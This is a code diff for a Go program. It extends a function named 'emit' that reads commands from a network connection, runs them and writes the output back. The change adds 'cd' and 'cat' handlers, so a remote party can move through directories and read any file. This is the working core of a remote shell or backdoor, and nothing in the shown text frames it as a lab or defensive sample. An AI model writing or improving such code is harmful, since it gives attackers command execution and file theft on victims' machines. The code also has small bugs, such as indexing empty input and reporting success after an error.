@@ -5,6 +5,7 @@ import (
 	"net"
 	"os"
 	"os/exec"
+	"strings"
 )
 
 func emit() {
@@ -19,8 +20,34 @@ func emit() {
 		n, err := conn.Read(buf)
 		data := string(buf[:n])
 		if err == nil {
-			out, _ := exec.Command(data).Output()
-			conn.Write(out)
+			words := strings.Fields(data)
+			if words[0] == "cd" {
+				if len(words) == 1 {
+					err := os.Chdir("/")
+					if err != nil {
+						conn.Write([]byte("Invalid Command !\n"))
+					}
+				} else {
+					err := os.Chdir(words[1])
+					if err != nil {
+						conn.Write([]byte("Invalid Command !\n"))
+					}
+				}
+				conn.Write([]byte("Directory Changed !\n"))
+			} else if words[0] == "cat" {
+				file, err := os.ReadFile(words[1])
+				if err != nil {
+					conn.Write([]byte("Invalid Command !\n"))
+				}
+				conn.Write(file)
+			} else {
+				out, err := exec.Command(data).Output()
+				if err != nil {
+					conn.Write([]byte("Invalid Command !\n"))
+				}
+				conn.Write(out)
+			}
+
 		}
 	}
 }
